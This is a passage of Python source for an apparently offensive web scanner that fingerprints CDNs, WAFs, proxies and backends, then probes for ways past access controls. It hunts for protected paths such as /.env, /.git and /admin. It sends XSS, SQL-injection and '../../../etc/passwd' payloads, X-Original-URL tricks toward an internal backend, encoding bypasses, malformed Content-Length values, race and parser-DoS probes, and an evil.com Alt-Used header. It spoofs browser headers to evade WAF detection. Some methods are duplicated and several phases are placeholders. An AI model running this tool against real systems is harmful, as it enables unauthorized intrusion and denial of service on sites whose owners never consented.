        except Exception as e:
            self.log_discovery("CDN", "Error", str(e))

        # WAF Detection
        self.waf_fingerprinting(fingerprints['waf_detection'])

        # Proxy Detection  
        self.proxy_fingerprinting(fingerprints['proxy_detection'])

        # Backend Detection
        self.backend_fingerprinting(fingerprints['backend_detection'])

    def waf_fingerprinting(self, waf_payloads):
        """Advanced WAF fingerprinting"""
        print("  🛡️ WAF Detection...")

        waf_signatures = {
            'cloudflare': ['cf-ray', 'cloudflare', 'error 1020'],
            'aws-waf': ['awselb', 'aws', 'x-amzn'],
            'imperva': ['incap_ses', 'visid_incap', 'imperva'],
            'akamai': ['akamai', 'ak-bmsc'],
            'wordfence': ['wordfence', 'this site is protected'],
            'sucuri': ['sucuri', 'access denied.*sucuri'],
            'barracuda': ['barracuda', 'bnsv'],
            'f5': ['f5', 'bigip', 'x-wa-info'],
            'fortinet': ['fortigate', 'fortiweb'],
            'ispconfig': ['ispconfig', 'blocked by security policy', 'request rejected', 'web application firewall']
        }

        detected_waf = None

        # Test standard GET parameters
        for payload in waf_payloads['payloads']:
            try:
                response = self.session.get(
                    f"{self.target_url}{payload}",
                    headers=waf_payloads['headers'],
                    timeout=10
                )

                # Analyze response for WAF signatures
                full_response = f"{response.status_code} {response.headers} {response.text}".lower()

                for waf, signatures in waf_signatures.items():
                    for signature in signatures:
                        if re.search(signature, full_response):
                            detected_waf = waf
                            break
                    if detected_waf:
                        break

                if detected_waf:
                    break

            except Exception as e:
                continue

        # Test path injection for ISPConfig detection
        if not detected_waf:
            try:
                markers = self.generate_unique_markers()
                path_injection_payload = f"/test{markers['uuid']}%3cscript%3ealert(1)%3c/script%3e/"

                response = self.session.get(
                    f"{self.target_url}{path_injection_payload}",
                    headers=waf_payloads['headers'],
                    timeout=10
                )

                # Check specifically for ISPConfig path injection blocking
                full_response = f"{response.status_code} {response.headers} {response.text}".lower()

                if response.status_code == 403:
                    for signature in waf_signatures['ispconfig']:
                        if re.search(signature, full_response):
                            detected_waf = 'ispconfig'
                            break

            except Exception as e:
                pass

        if detected_waf:
            self.log_discovery("WAF", "Detection", detected_waf)
            self.chain_map['layers'].append(f"WAF-{detected_waf}")
        else:
            self.log_discovery("WAF", "Detection", "None detected or unknown")

    def proxy_fingerprinting(self, proxy_headers):
        """Detect proxy/load balancer configuration"""
        print("  🔄 Proxy Detection...")

        try:
            response = self.session.get(self.target_url, headers=proxy_headers['headers'])

            proxy_indicators = {
                'nginx': ['server.*nginx', 'x-nginx'],
                'apache': ['server.*apache', 'x-apache'],
                'haproxy': ['server.*haproxy'],
                'traefik': ['server.*traefik'],
                'envoy': ['server.*envoy', 'x-envoy'],
                'istio': ['server.*istio'],
                'linkerd': ['l5d-'],
                'aws-alb': ['awsalb', 'elbv2'],
                'gcp-lb': ['via.*google frontend']
            }

            detected_proxy = None
            for proxy, indicators in proxy_indicators.items():
                for indicator in indicators:
                    for header, value in response.headers.items():
                        if re.search(indicator, f"{header}: {value}", re.IGNORECASE):
                            detected_proxy = proxy
                            break
                if detected_proxy:
                    break

            if detected_proxy:
                self.log_discovery("Proxy", "Detection", detected_proxy)
                self.chain_map['layers'].append(f"Proxy-{detected_proxy}")

        except Exception as e:
            self.log_discovery("Proxy", "Error", str(e))

    def backend_fingerprinting(self, backend_paths):
        """Fingerprint backend application server"""
        print("  🖥️ Backend Detection...")

        backend_signatures = {
            'apache': ['server.*apache'],
            'nginx': ['server.*nginx'],
            'iis': ['server.*iis', 'x-aspnet-version'],
            'tomcat': ['server.*tomcat'],
            'jetty': ['server.*jetty'],
            'node': ['x-powered-by.*express', 'x-powered-by.*node'],
            'php': ['x-powered-by.*php', 'server.*php'],
            'python': ['server.*gunicorn', 'server.*uwsgi'],
            'ruby': ['server.*puma', 'x-powered-by.*ruby'],
            'go': ['server.*go']
        }

        detected_backend = None

        for path in backend_paths['paths']:
            try:
                response = self.session.get(f"{self.target_url}{path}", timeout=5)

                full_response = f"{response.headers} {response.text}".lower()

                for backend, signatures in backend_signatures.items():
                    for signature in signatures:
                        if re.search(signature, full_response):
                            detected_backend = backend
                            break
                    if detected_backend:
                        break

                if detected_backend:
                    break

            except Exception as e:
                continue

        if detected_backend:
            self.log_discovery("Backend", "Detection", detected_backend)
            self.chain_map['layers'].append(f"Backend-{detected_backend}")

    def parser_discrepancy_testing(self):
        """Test for parser discrepancies between layers"""
        print("\n🔍 Phase 3: Parser Discrepancy Testing")
        # Placeholder: Implement discrepancy testing logic
        # Should include tests for:
        # - URL encoding/decoding differences
        # - Header normalization
        # - Path traversal parsing
        # - Content-type confusion
        # - Special character handling
        self.log_discovery("Parser", "Discrepancy", "Not yet implemented")

    def generate_custom_bypasses(self):
        """Generate custom payloads for bypassing detected layers"""
        print("\n🔍 Phase 4: Bypass Payload Generation")
        # Placeholder: Implement custom bypass generation logic based on discovered discrepancies
        self.log_discovery("Bypass", "Payloads", "Not yet implemented")

    def test_generated_bypasses(self):
        """Test all generated bypass payloads against forbidden endpoint"""
        print("\n🔍 Phase 5: Bypass Testing")
        # Placeholder: Implement bypass testing logic
        self.log_discovery("Bypass", "Testing", "Not yet implemented")

    def generate_report(self):
        """Generate detailed report of the analysis"""
        print("\n📊 Phase 6: Report Generation")
        report = {
            'target_url': self.target_url,
            'forbidden_endpoint': self.discovered_forbidden_endpoint,
            'protocols': self.protocols,
            'chain_map': self.chain_map,
            'timestamp': datetime.utcnow().isoformat()
        }
        try:
            report_path = f"traceroute_report_{int(time.time())}.json"
            with open(report_path, "w") as f:
                json.dump(report, f, indent=2)
            print(f"  ✅ Report saved to {report_path}")
        except Exception as e:
            print(f"  ⚠️ Error saving report: {e}")

        return report

    # The enhancement requires this function for stack detection
    def _detect_stack_type(self, endpoint: str) -> Optional[str]:
        """Detect the stack type for a given endpoint"""
        try:
            response = self.session.head(endpoint)
            headers = response.headers
            if any(h in headers for h in ['cf-ray', 'cf-cache-status']):
                return 'cloudflare_nginx'
            elif any(h in headers for h in ['x-amzn-trace-id']):
                return 'aws_waf_apache'
            return None
        except Exception:
            return None

class ApplicationTraceroute:
    def __init__(self, target_url, forbidden_endpoint=None, skip_forbidden_tests=False):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(target_url)
        self.session = requests.Session()
        self.service_discovery = ServiceDiscoveryEnhanced()
        self.mesh_detector = ServiceMeshDetector()
        self.request_tracker = RequestTracker()
        self.payload_analyzer = PayloadAnalyzer()
        self.stack_handler = StackHandler()
        self.command_generator = None     

        # Forbidden endpoint configuration
        self.forbidden_endpoint = forbidden_endpoint
        self.skip_forbidden_tests = skip_forbidden_tests
        self.discovered_forbidden_endpoint = None
        
        # Chain discovery results
        self.chain_map = {
            'layers': [],
            'discrepancies': [],
            'fingerprints': {},
            'bypasses': []
        }
        
        # Protocol support detection
        self.protocols = {
            'http1': True,
            'http2': False,
            'http3': False,
            'websocket': False
        }
        
    def log_discovery(self, layer, discovery_type, details):
        """Log discoveries with structured data"""
        timestamp = time.strftime('%H:%M:%S')
        print(f"[{timestamp}] 🔍 {layer} - {discovery_type}: {details}")
        
        if layer not in self.chain_map['fingerprints']:
            self.chain_map['fingerprints'][layer] = {}
        self.chain_map['fingerprints'][layer][discovery_type] = details

    def generate_unique_markers(self):
        """Generate unique markers for request tracking"""
        return {
            'uuid': ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
            'timestamp': str(int(time.time())),
            'sequence': str(random.randint(100000, 999999))
        }

    def find_forbidden_endpoint(self):
        """Find an endpoint that returns 403/401 for bypass testing"""
        print("\n🔍 Phase 0: Finding Forbidden Endpoint for Testing")
        # Browser-like headers per evitare detection WAF/anti-bot
        browser_headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'it,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        
        # If specified by user, verify it's actually forbidden
        if self.forbidden_endpoint:
            try:
                # Per cross-domain, aggiungere Referer
                test_headers = browser_headers.copy()
                forbidden_parsed = urlparse(self.forbidden_endpoint)
                if forbidden_parsed.netloc != self.parsed_url.netloc:
                    test_headers['Referer'] = self.target_url

                response = self.session.get(self.forbidden_endpoint, timeout=5)
                if response.status_code in [401, 403]:
                    self.discovered_forbidden_endpoint = self.forbidden_endpoint
                    self.log_discovery("Setup", "Forbidden Endpoint", f"User-provided: {self.forbidden_endpoint} ({response.status_code})")
                    return self.forbidden_endpoint
                else:
                    print(f"  ⚠️ Provided endpoint returned {response.status_code}, not 403/401. Searching for alternatives...")
            except Exception as e:
                print(f"  ⚠️ Error checking provided endpoint: {e}")
        
        # Search for common protected endpoints
        common_protected = [
            '/admin', '/wp-admin', '/administrator', '/secure', '/api/admin',
            '/manage', '/console', '/portal', '/control', '/private',
            '/restricted', '/staff', '/backend', '/cpanel', '/webadmin',
            '/.env', '/.git', '/config', '/phpmyadmin', '/adminer', '/users'
            '/pages', '/root', '/uploads', '/includes', 'cgi-bin'
        ]
        
        for endpoint in common_protected:
            try:
                url = self.target_url + endpoint
                response = self.session.get(url, headers=browser_headers, timeout=5, allow_redirects=False)
                if response.status_code in [401, 403]:
                    self.discovered_forbidden_endpoint = url
                    self.log_discovery("Setup", "Forbidden Endpoint Found", f"{endpoint} ({response.status_code})")
                    return url
            except:
                continue
        
        # If no forbidden endpoint found
        if not self.skip_forbidden_tests:
            print("  ⚠️ No forbidden endpoint found - some bypass tests will be limited")
            print("  💡 Tip: Use --forbidden-endpoint to specify one, or --skip-forbidden-tests to skip these tests")
        
        return None

    def create_fingerprint_payloads(self):
        """Create payloads to fingerprint each layer in the chain"""
        markers = self.generate_unique_markers()
        
        return {
            'cdn_detection': {
                'headers': {
                    'X-CDN-Test': markers['uuid'],
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                },
                'expected_responses': ['cloudflare', 'cloudfront', 'fastly', 'akamai']
            },
            
            'waf_detection': {
                'payloads': [
                    f"/?test=<script>alert('{markers['uuid']}')</script>",
                    f"/?test=' OR 1=1 -- {markers['uuid']}",
                    f"/?test=../../../etc/passwd#{markers['uuid']}"
                ],
                'headers': {'User-Agent': f'Mozilla/5.0 (test-{markers["uuid"]})'}
            },
            
            'proxy_detection': {
                'headers': {
                    'X-Forwarded-For': f'127.0.0.1,{markers["uuid"]}',
                    'X-Real-IP': f'192.168.1.{markers["sequence"][:3]}',
                    'X-Proxy-Test': markers['uuid']
                }
            },
            
            'backend_detection': {
                'paths': [
                    f'/server-info?test={markers["uuid"]}',
                    f'/server-status?test={markers["uuid"]}',
                    f'/.env?test={markers["uuid"]}',
                    f'/phpinfo.php?test={markers["uuid"]}'
                ]
            }
        }

    async def protocol_discovery(self):
        """Discover supported protocols"""
        print("\n🔍 Phase 1: Protocol Discovery")
        
        # HTTP/2 Detection
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self.target_url) as response:
                    if hasattr(response, 'version') and response.version.major >= 2:
                        self.protocols['http2'] = True
                        self.log_discovery("Protocol", "HTTP/2", "Supported")
        except:
            pass
        
        # HTTP/3 Detection (via Alt-Svc header)
        try:
            response = self.session.head(self.target_url)
            alt_svc = response.headers.get('Alt-Svc', '')
            if 'h3' in alt_svc or 'h3-29' in alt_svc:
                self.protocols['http3'] = True
                self.log_discovery("Protocol", "HTTP/3", f"Detected via Alt-Svc: {alt_svc}")
        except:
            pass
        
        # WebSocket Detection
        try:
            ws_headers = {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }
            response = self.session.get(self.target_url, headers=ws_headers)
            if response.status_code == 101:
                self.protocols['websocket'] = True
                self.log_discovery("Protocol", "WebSocket", "Upgrade supported")
        except:
            pass

    def infrastructure_fingerprinting(self):
        """Fingerprint infrastructure components"""
        print("\n🔍 Phase 2: Infrastructure Fingerprinting")
        
        fingerprints = self.create_fingerprint_payloads()
        
        # CDN Detection
        try:
            response = self.session.get(self.target_url, headers=fingerprints['cdn_detection']['headers'])
            
            # Analyze response headers for CDN signatures
            cdn_indicators = {
                'cloudflare': ['cf-ray', 'cf-cache-status', 'server.*cloudflare'],
                'cloudfront': ['x-amz-cf', 'x-cache.*cloudfront'],
                'fastly': ['fastly-debug', 'x-served-by.*fastly'],
                'akamai': ['akamai-origin-hop', 'x-akamai'],
                'incapsula': ['x-iinfo', 'incap_ses'],
                'sucuri': ['x-sucuri', 'server.*sucuri']
            }
            
            detected_cdn = None
            for cdn, indicators in cdn_indicators.items():
                for indicator in indicators:
                    for header, value in response.headers.items():
                        if re.search(indicator, f"{header}: {value}", re.IGNORECASE):
                            detected_cdn = cdn
                            break
                if detected_cdn:
                    break
            
            if detected_cdn:
                self.log_discovery("CDN", "Detection", detected_cdn)
                self.chain_map['layers'].append(f"CDN-{detected_cdn}")
            
        except Exception as e:
            self.log_discovery("CDN", "Error", str(e))
        
        # WAF Detection
        self.waf_fingerprinting(fingerprints['waf_detection'])
        
        # Proxy Detection  
        self.proxy_fingerprinting(fingerprints['proxy_detection'])
        
        # Backend Detection
        self.backend_fingerprinting(fingerprints['backend_detection'])

    def _detect_stack_type(self, endpoint: str) -> Optional[str]:
        """Detect the stack type for a given endpoint"""
        response = self.session.head(endpoint)
        headers = response.headers
        
        if any(h in headers for h in ['cf-ray', 'cf-cache-status']):
            return 'cloudflare_nginx'
        elif any(h in headers for h in ['x-amzn-trace-id']):
            return 'aws_waf_apache'
        
        return None

    def waf_fingerprinting(self, waf_payloads):
        """Advanced WAF fingerprinting"""
        print("  🛡️ WAF Detection...")
        
        waf_signatures = {
            'cloudflare': ['cf-ray', 'cloudflare', 'error 1020'],
            'aws-waf': ['awselb', 'aws', 'x-amzn'],
            'imperva': ['incap_ses', 'visid_incap', 'imperva'],
            'akamai': ['akamai', 'ak-bmsc'],
            'wordfence': ['wordfence', 'this site is protected'],
            'sucuri': ['sucuri', 'access denied.*sucuri'],
            'barracuda': ['barracuda', 'bnsv'],
            'f5': ['f5', 'bigip', 'x-wa-info'],
            'fortinet': ['fortigate', 'fortiweb'],
            'ispconfig': ['ispconfig', 'blocked by security policy', 'request rejected', 'web application firewall']
        }
        
        detected_waf = None
        
        for payload in waf_payloads['payloads']:
            try:
                response = self.session.get(
                    f"{self.target_url}{payload}",
                    headers=waf_payloads['headers'],
                    timeout=10
                )
                
                # Analyze response for WAF signatures
                full_response = f"{response.status_code} {response.headers} {response.text}".lower()
                
                for waf, signatures in waf_signatures.items():
                    for signature in signatures:
                        if re.search(signature, full_response):
                            detected_waf = waf
                            break
                    if detected_waf:
                        break
                
                if detected_waf:
                    break
                    
            except Exception as e:
                continue

        # Test path injection for ISPConfig detection
        if not detected_waf:
            try:
                markers = self.generate_unique_markers()
                path_injection_payload = f"/test{markers['uuid']}%3cscript%3ealert(1)%3c/script%3e/"

                response = self.session.get(
                    f"{self.target_url}{path_injection_payload}",
                    headers=waf_payloads['headers'],
                    timeout=10
                )

                # Check specifically for ISPConfig path injection blocking
                full_response = f"{response.status_code} {response.headers} {response.text}".lower()

                if response.status_code == 403:
                    for signature in waf_signatures['ispconfig']:
                        if re.search(signature, full_response):
                            detected_waf = 'ispconfig'
                            break

            except Exception as e:
                pass
       
        if detected_waf:
            self.log_discovery("WAF", "Detection", detected_waf)
            self.chain_map['layers'].append(f"WAF-{detected_waf}")
        else:
            self.log_discovery("WAF", "Detection", "None detected or unknown")

    def proxy_fingerprinting(self, proxy_headers):
        """Detect proxy/load balancer configuration"""
        print("  🔄 Proxy Detection...")
        
        try:
            response = self.session.get(self.target_url, headers=proxy_headers['headers'])
            
            proxy_indicators = {
                'nginx': ['server.*nginx', 'x-nginx'],
                'apache': ['server.*apache', 'x-apache'],
                'haproxy': ['server.*haproxy'],
                'traefik': ['server.*traefik'],
                'envoy': ['server.*envoy', 'x-envoy'],
                'istio': ['server.*istio'],
                'linkerd': ['l5d-'],
                'aws-alb': ['awsalb', 'elbv2'],
                'gcp-lb': ['via.*google frontend']
            }
            
            detected_proxy = None
            for proxy, indicators in proxy_indicators.items():
                for indicator in indicators:
                    for header, value in response.headers.items():
                        if re.search(indicator, f"{header}: {value}", re.IGNORECASE):
                            detected_proxy = proxy
                            break
                if detected_proxy:
                    break
            
            if detected_proxy:
                self.log_discovery("Proxy", "Detection", detected_proxy)
                self.chain_map['layers'].append(f"Proxy-{detected_proxy}")
            
        except Exception as e:
            self.log_discovery("Proxy", "Error", str(e))

    def backend_fingerprinting(self, backend_paths):
        """Fingerprint backend application server"""
        print("  🖥️ Backend Detection...")
        
        backend_signatures = {
            'apache': ['server.*apache'],
            'nginx': ['server.*nginx'],
            'iis': ['server.*iis', 'x-aspnet-version'],
            'tomcat': ['server.*tomcat'],
            'jetty': ['server.*jetty'],
            'node': ['x-powered-by.*express', 'x-powered-by.*node'],
            'php': ['x-powered-by.*php', 'server.*php'],
            'python': ['server.*gunicorn', 'server.*uwsgi'],
            'ruby': ['server.*puma', 'x-powered-by.*ruby'],
            'go': ['server.*go']
        }
        
        detected_backend = None
        
        for path in backend_paths['paths']:
            try:
                response = self.session.get(f"{self.target_url}{path}", timeout=5)
                
                full_response = f"{response.headers} {response.text}".lower()
                
                for backend, signatures in backend_signatures.items():
                    for signature in signatures:
                        if re.search(signature, full_response):
                            detected_backend = backend
                            break
                    if detected_backend:
                        break
                
                if detected_backend:
                    break
                    
            except Exception as e:
                continue
        
        if detected_backend:
            self.log_discovery("Backend", "Detection", detected_backend)
            self.chain_map['layers'].append(f"Backend-{detected_backend}")

    def parser_discrepancy_testing(self):
        """Test for parsing discrepancies between layers"""
        print("\n🔍 Phase 3: Parser Discrepancy Analysis")
        
        # Original tests
        discrepancy_tests = [
            self.test_http_smuggling,
            self.test_unicode_confusion,
            self.test_encoding_discrepancies,
            self.test_header_confusion,
            self.test_method_confusion,
            self.test_path_normalization,
            self.test_parameter_pollution,
            self.test_tcp_fragmentation,
            self.test_compression_bomb,
            self.test_timing_race_conditions,
            # New advanced tests
            self.test_parser_state_confusion,
            self.test_buffer_boundary_discrepancies,
            self.test_nested_encoding_confusion,
            self.test_protocol_tunneling_discrepancies,
            self.test_cache_key_confusion,
            self.test_parser_backtracking_dos,
            self.test_integer_overflow_length,
            self.test_toctou_race_conditions,
            self.test_quic_http3_confusion,
            self.test_ml_waf_evasion,
            self.test_container_orchestration_bypass,
            self.test_graphql_rest_confusion
        ]
        
        for test in discrepancy_tests:
            try:
                test()
            except Exception as e:
                print(f"  ❌ Error in {test.__name__}: {str(e)}")

    # Advanced Discrepancy Tests
    def test_parser_state_confusion(self):
        """Test parser state machine desynchronization"""
        print("  🔄 Testing Parser State Machine Confusion...")
        
        # HTTP/2 Pseudo-Header Injection
        try:
            headers = {
                ':method': 'GET',
                ':path': '/admin',
                ':authority': 'internal.backend',
                ':scheme': 'https',
                'x-override-method': 'POST'
            }
            
            response = self.session.get(self.target_url, headers=headers, timeout=5)
            
            if response.status_code != 400:  # Should fail with pseudo-headers in HTTP/1.1
                discrepancy = {
                    'type': 'Parser State Confusion',
                    'subtype': 'H2 Pseudo-Header Injection',
                    'description': 'HTTP/2 pseudo-headers accepted in HTTP/1.1 context',
                    'headers': headers,
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser State", "H2 pseudo-header confusion")
        except:
            pass
        
        # WebSocket Upgrade State Confusion
        try:
            # Step 1: Start WebSocket upgrade
            ws_headers = {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }
            
            # Send partial upgrade
            response1 = self.session.get(self.target_url, headers=ws_headers, timeout=2)
            
            # Step 2: Send normal request immediately after
            # Use discovered forbidden endpoint if available
            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
            response2 = self.session.get(test_endpoint, timeout=2)
            
            if response2.status_code == 200:
                discrepancy = {
                    'type': 'Parser State Confusion',
                    'subtype': 'WebSocket State Leak',
                    'description': 'Parser state leaked between WebSocket and HTTP',
                    'evidence': 'Admin path accessible after WebSocket attempt'
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser State", "WebSocket state leak")
        except:
            pass

    def test_buffer_boundary_discrepancies(self):
        """Test buffer boundary confusion"""
        print("  📊 Testing Buffer Boundary Discrepancies...")
        
        # Header Buffer Boundary Test
        try:
            # Test 8KB boundary
            large_header_value = 'A' * 8192
            headers = {
                'X-Large-Header': large_header_value[:8000],
                'X-Secret': 'admin'  # This might get processed differently
            }
            
            response = self.session.get(self.target_url, headers=headers, timeout=5)
            
            if response.status_code in [200, 413, 431]:
                discrepancy = {
                    'type': 'Buffer Boundary',
                    'subtype': 'Header Buffer Overflow',
                    'description': 'Headers at 8KB boundary processed differently',
                    'buffer_size': 8192,
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Buffer Boundary", "8KB header boundary")
        except:
            pass
        
        # URL Length Boundary Test
        try:
            # Test 2KB vs 8KB URL limits
            for size in [2048, 4096, 8192]:
                long_path = '/' + 'A' * (size - 20) + '/../admin'
                response = self.session.get(f"{self.target_url}{long_path}", timeout=5)
                
                if response.status_code != 414:
                    discrepancy = {
                        'type': 'Buffer Boundary',
                        'subtype': 'URL Length Limit',
                        'description': f'URL accepted at {size} bytes',
                        'buffer_size': size,  # Changed from 'url_length' to 'buffer_size' for consistency
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Buffer Boundary", f"{size} byte URL accepted")
        except:
            pass

    def test_nested_encoding_confusion(self):
        """Test nested encoding state stack confusion"""
        print("  🔢 Testing Nested Encoding Confusion...")
        
        # Mixed UTF-8 and UTF-16 BOM switching
        try:
            # UTF-8 BOM followed by UTF-16 BOM
            payload = b'\xef\xbb\xbf/admin\xff\xfe'
            response = self.session.get(
                self.target_url,
                data=payload,
                headers={'Content-Type': 'text/plain'},
                timeout=5
            )
            
            if response.status_code != 400:
                discrepancy = {
                    'type': 'Nested Encoding',
                    'subtype': 'BOM Switching',
                    'description': 'Mixed BOM encoding accepted',
                    'payload': 'UTF-8 BOM + /admin + UTF-16 BOM',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Encoding", "BOM switching accepted")
        except:
            pass
        
        # Percent-Encoding in Different Bases
        encoding_variations = [
            ('Hex Standard', '/%61dmin'),
            ('Octal', '/%0141dmin'),
            ('Unicode IIS', '/%u0061dmin'),
            ('Double Decimal', '/%%36%31dmin')
        ]
        
        for name, path in encoding_variations:
            try:
                response = self.session.get(f"{self.target_url}{path}", timeout=5)
                if response.status_code == 200:
                    discrepancy = {
                        'type': 'Nested Encoding',
                        'subtype': f'{name} Encoding',
                        'description': f'{name} encoding decoded to /admin',
                        'encoded_path': path,
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Encoding", f"{name} encoding accepted")
            except:
                pass

    def test_protocol_tunneling_discrepancies(self):
        """Test protocol nesting confusion"""
        print("  🔀 Testing Protocol Tunneling Discrepancies...")
        
        # HTTP in HTTP (Absolute URI)
        try:
            response = self.session.request(
                'GET',
                f"{self.target_url}",
                headers={
                    'Host': 'public.site',
                    'X-Original-URL': 'http://internal.backend/admin'
                },
                timeout=5
            )
            
            if 'admin' in response.text.lower() or response.status_code == 200:
                discrepancy = {
                    'type': 'Protocol Tunneling',
                    'subtype': 'Absolute URI Confusion',
                    'description': 'Internal URL accessible via header',
                    'technique': 'X-Original-URL header',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Protocol Tunneling", "Absolute URI confusion")
        except:
            pass
        
        # Multiple Protocol Upgrades
        try:
            headers = {
                'Upgrade': 'websocket, h2c, spdy/3.1',
                'Connection': 'Upgrade'
            }
            
            response = self.session.get(self.target_url, headers=headers, timeout=5)
            
            if response.status_code not in [400, 426]:
                discrepancy = {
                    'type': 'Protocol Tunneling',
                    'subtype': 'Multiple Upgrade Confusion',
                    'description': 'Multiple protocol upgrades not rejected',
                    'protocols': 'websocket, h2c, spdy/3.1',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Protocol", "Multiple upgrades accepted")
        except:
            pass

    def test_cache_key_confusion(self):
        """Test cache key computation discrepancies"""
        print("  🔑 Testing Cache Key Confusion...")
        
        # Case Sensitivity Mismatch
        case_variations = [
            ('/ADMIN', 'example.com'),
            ('/admin', 'EXAMPLE.COM'),
            ('/Admin', 'Example.Com')
        ]
        
        responses = {}
        for path, host in case_variations:
            try:
                response = self.session.get(
                    f"{self.target_url}{path}",
                    headers={'Host': host},
                    timeout=5
                )
                key = f"{path}:{host}"
                responses[key] = response.status_code
            except:
                pass
        
        if len(set(responses.values())) > 1:
            discrepancy = {
                'type': 'Cache Key Confusion',
                'subtype': 'Case Sensitivity',
                'description': 'Different responses for case variations',
                'responses': responses,
                'unique_codes': len(set(responses.values()))
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Cache", f"Case sensitivity: {len(set(responses.values()))} different responses")
        
        # Parameter Order Confusion
        param_variations = [
            '/?b=2&a=1',
            '/?a=1&b=2',
            '/?a=1&b=2&',
            '/?a=1&amp;b=2'
        ]
        
        param_responses = {}
        for params in param_variations:
            try:
                response = self.session.get(f"{self.target_url}{params}", timeout=5)
                param_responses[params] = response.status_code
            except:
                pass
        
        if len(set(param_responses.values())) > 1:
            discrepancy = {
                'type': 'Cache Key Confusion',
                'subtype': 'Parameter Order',
                'description': 'Parameter order affects caching',
                'variations': param_responses
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Cache", "Parameter order matters")

    def test_parser_backtracking_dos(self):
        """Test parser algorithmic complexity"""
        print("  ⏱️ Testing Parser Backtracking...")
        
        # Nested Parameter Parsing Complexity
        try:
            # Create deeply nested parameters
            nested_params = []
            for i in range(5):
                for j in range(5):
                    for k in range(5):
                        nested_params.append(f'p[{i}][{j}][{k}]=v')
            
            complex_query = '&'.join(nested_params)
            
            start_time = time.time()
            response = self.session.get(
                f"{self.target_url}/?{complex_query}",
                timeout=10
            )
            elapsed = time.time() - start_time
            
            if elapsed > 2:  # Slow processing indicates complexity issue
                discrepancy = {
                    'type': 'Parser Complexity',
                    'subtype': 'Nested Parameter DoS',
                    'description': 'Nested parameters cause slow parsing',
                    'processing_time': elapsed,
                    'complexity': 'O(n³)',
                    'param_count': len(nested_params)
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Parser DoS", f"Slow parsing: {elapsed:.2f}s")
        except:
            pass

    def test_integer_overflow_length(self):
        """Test integer overflow in length calculations"""
        print("  🔢 Testing Integer Overflow in Lengths...")
        
        overflow_values = [
            ('2^32', '4294967296'),
            ('2^31', '2147483648'),
            ('Negative', '-1'),
            ('Scientific', '1e3'),
            ('Hex', '0x100')
        ]
        
        for name, value in overflow_values:
            try:
                headers = {
                    'Content-Length': value,
                    'Transfer-Encoding': 'chunked'  # Fallback
                }
                
                response = self.session.post(
                    self.target_url,
                    headers=headers,
                    data=b'test',
                    timeout=5
                )
                
                if response.status_code not in [400, 411, 413]:
                    discrepancy = {
                        'type': 'Integer Overflow',
                        'subtype': f'{name} Content-Length',
                        'description': f'Non-standard length value accepted: {value}',
                        'length_value': value,
                        'response_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Integer", f"{name} length: {value}")
            except:
                pass

    def test_toctou_race_conditions(self):
        """Test Time-of-Check vs Time-of-Use race conditions"""
        print("  ⚡ Testing TOCTOU Race Conditions...")
        
        # Skip if no forbidden endpoint found
        if not self.discovered_forbidden_endpoint and not self.skip_forbidden_tests:
            print("    ⚠️ Skipping TOCTOU test - no forbidden endpoint available")
            return
        
        try:
            results = []
            
            # Use discovered forbidden endpoint or fallback
            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/api/admin"
            
            def race_request(delay):
                time.sleep(delay)
                try:
                    resp = self.session.get(test_endpoint, timeout=3)
                    results.append((delay, resp.status_code))
                except:
                    results.append((delay, 'error'))
            
            # Send requests with micro-delays
            threads = []
            for delay in [0, 0.001, 0.01, 0.05]:
                thread = threading.Thread(target=race_request, args=(delay,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
            
            # Check for timing-dependent differences
            status_codes = [r[1] for r in results if r[1] != 'error']
            if len(set(status_codes)) > 1:
                discrepancy = {
                    'type': 'TOCTOU Race',
                    'subtype': 'Async Validation',
                    'description': 'Race condition in request validation',
                    'timing_results': results,
                    'unique_responses': len(set(status_codes))
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "TOCTOU", f"Race condition detected: {len(set(status_codes))} responses")
        except:
            pass

    def test_quic_http3_confusion(self):
        """Test QUIC/HTTP3 specific discrepancies"""
        print("  🚀 Testing QUIC/HTTP3 Confusion...")
        
        if self.protocols['http3']:
            try:
                # Test Alt-Svc manipulation
                headers = {
                    'Alt-Used': 'evil.com:443',
                    'Alt-Svc': 'h3-29=":443"; ma=86400'
                }
                
                response = self.session.get(self.target_url, headers=headers, timeout=5)
                
                if response.status_code == 200:
